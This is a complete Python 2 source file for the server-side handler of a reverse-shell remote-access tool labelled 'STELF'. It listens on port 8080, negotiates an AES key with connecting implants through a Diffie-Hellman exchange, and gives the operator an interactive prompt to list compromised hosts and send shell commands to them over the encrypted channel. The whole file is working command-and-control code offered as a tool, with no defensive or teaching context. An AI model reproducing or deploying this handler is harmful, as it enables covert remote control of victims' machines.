import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import sys
import readline
from colorama import init, Fore, Style
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib

import __builtin__ 

def raw_input2(prompt=''): 
	try: 
		return raw_input1(prompt) 
	except EOFError as exc: 
		time.sleep(0.05) 
		raise 

raw_input1 = raw_input 
__builtin__.raw_input = raw_input2

init(autoreset=True)

INFO = Style.BRIGHT + Fore.BLUE + "\n[*] " + Style.RESET_ALL
BAD = Style.BRIGHT + Fore.RED + "\n[-] " + Style.RESET_ALL
GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] " + Style.RESET_ALL

logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(id)))

	def write_input(self, data): # This function is used to feed data into a channel.
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True): # This function is used to read data from a channel.
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data): # This function is used to send data to the handler.
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(id))
	
class Transport:
	""""
	Used to transfer data between the handler and a client.
	"""
	def __init__(self, sock, addr, port, id, aes_obj, client):
		self.client_id = id
		self.address = addr
		self.port = port
		self.client = client
		
		self.comm_socket = sock
		
		self.aes_obj = aes_obj
		
		self.master_queue = Queue.Queue() # Data that has to be sent is put on this queue.
		self.user_channel = Channel(chr(97), self.master_queue) # Channel for user input and shell output.
		self.signal_channel = Channel(chr(254), self.master_queue) # Channel used for signalling: Requesting new channels, etc.
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}
		
		self.disconnected = False
		
		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		logging.debug("Created new transport for client #"+str(self.client_id))
		
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data)
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		try: data = self.comm_socket.recv(4096)
		except: data = ""
		if not data:
			self.comm_socket.close()
			logging.error("Client #"+str(self.client_id)+" disconnected")
			self.disconnected = True
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal)
			if signal == "CREATE_CHANNEL":
				pass
				
	def signal(self, data):
		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data)
		self.master_queue.put(chr(254)+data)
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Client:
	"""
	Represents a connected client.
	"""
	def __init__(self, id, cli, ip, port, aes_obj):
		self.transport = Transport(cli, ip, port, id, aes_obj, self)
		self.id = id
		
	def send(self, data):
		self.transport.user_channel.write_output(data)
		
	def recv(self):
		return self.transport.user_channel.read_input()
		
	def signal(self, data):
		return self.transport.signal(data)
	
	def interact(self):
		logging.info("Starting interaction with client #"+str(self.id))
		self.send("cd .")
		cwd = self.recv()
		sys.stdout.write(cwd)
		
		while True:
			try:
				user_input = raw_input()
			except KeyboardInterrupt:
				print "\nBackgrounding session."
				return True
			logging.debug("Got user input: "+user_input)

			self.send(user_input)
			
			data = self.recv()
			logging.debug("Result of user input: "+data)
			if data == "CONN_LOST":
				print "Client Disconnected"
				return False
			elif data.startswith("BG_NEW_SESH"):
				print "A new session should appear within 30 seconds."
				return True
			sys.stdout.write(data)
		
class Handler:
	"""
	Main handler class. Sets up a socket for clients to connect to.
	"""
	def __init__(self, bind_addr, bind_port):
		self.bind_addr = bind_addr
		self.bind_port = bind_port
		self.sock = socket.socket()
		self.sock.bind((bind_addr, bind_port))
		self.sock.listen(5)
	
		self.clients = []
		
		self.interacting = False
		self.current_id = 0
		
	def dh_exchange(self, client):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = client.recv(4096)
		client.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
		
	def accepter(self):
		ct = threading.currentThread()
		while not ct.stopped():
			cli, addr = self.sock.accept()
			address, port = addr
			
			id = self.current_id
			self.current_id += 1
			aes = self.dh_exchange(cli)
			c = Client(id, cli, address, port, aes)
			self.clients.append(c)
			if not self.interacting:
				sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
				print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
				sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
				sys.stdout.flush()
		
	def run(self):
		t = StoppableThread(target=self.accepter)
		t.daemon = True
		t.start()
		while True:
			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
			except KeyboardInterrupt: print GOOD + "Bye!"
			
			if user_input == "list" or user_input == "l":
				print INFO + "Current active sessions:"
				print "========================"
				for c in self.clients:
					print "["+str(c.id)+"]: " + c.transport.address + ":" + str(c.transport.port)
					
				print"\n========================"
				
			elif user_input.startswith("i"):
				self.interacting = True
				try:
					the_chosen_one = [c for c in self.clients if c.id == int(user_input.split()[1])][0] # too lazy to make it properly
				except:
					print BAD + "No such client."
					continue
				if not the_chosen_one.interact(): self.clients.remove(the_chosen_one)
				self.interacting = False
		
Handler("0.0.0.0",8080).run()